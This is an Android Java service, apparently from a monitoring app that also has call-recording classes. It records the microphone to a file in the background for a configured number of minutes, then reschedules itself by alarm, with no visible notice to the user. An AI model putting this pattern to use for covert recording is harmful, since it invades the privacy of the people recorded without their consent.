/*
 * Copyright 2016 Keval Patel.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package rapidora.co.myapplication.audioRecorder;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;

import rapidora.co.myapplication.CallRecording.FileHelper;
import rapidora.co.myapplication.common.SessionManagment;
import rapidora.co.myapplication.common.Utils;


/**
 * Created by Keval on 11-Nov-16.
 *
 * @author {@link 'https://github.com/kevalpatel2106'}
 */

public class AudioRecorderService extends Service {
    String fileName;
    SessionManagment sd;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        sd = new SessionManagment(getApplicationContext());

        MediaRecorder recorder = new MediaRecorder();


        try {
            Log.e("Start service Audio Recorder", "Start");
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            fileName = FileHelper.getFilename2("record", getApplicationContext());
            recorder.setOutputFile(fileName);


            MediaRecorder.OnErrorListener errorListener = new MediaRecorder.OnErrorListener() {
                public void onError(MediaRecorder arg0, int arg1, int arg2) {
                    //    Log.e(Constants.TAG, "OnErrorListener " + arg1 + "," + arg2);
                    //	terminateAndEraseFile();
                }
            };
            recorder.setOnErrorListener(errorListener);

            MediaRecorder.OnInfoListener infoListener = new MediaRecorder.OnInfoListener() {
                public void onInfo(MediaRecorder arg0, int arg1, int arg2) {
                    //     Log.e(Constants.TAG, "OnInfoListener " + arg1 + "," + arg2);
                    //	terminateAndEraseFile();
                }
            };
            recorder.setOnInfoListener(infoListener);

            recorder.prepare();
            // Sometimes prepare takes some time to complete
            Thread.sleep(2000);
            recorder.start();

        } catch (Exception e1) {
            e1.printStackTrace();

        }

        final Handler handler = new Handler();
        final MediaRecorder finalRecorder = recorder;
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                Log.e("stop service Audio Recorder", "stoped");
                // Toast.makeText(DemoCamService.this, "Stop sercice", Toast.LENGTH_LONG).show();
                finalRecorder.stop();
                stopSelf();
                Utils.cancelAlarmAudioRecord(getApplicationContext());
                Utils.scheduleAlarmAudioRecord(getApplicationContext());

            }
        }, sd.getAUDIo_LISTEN_DURATION() * 60 * 1000);

        return START_NOT_STICKY;
    }


}
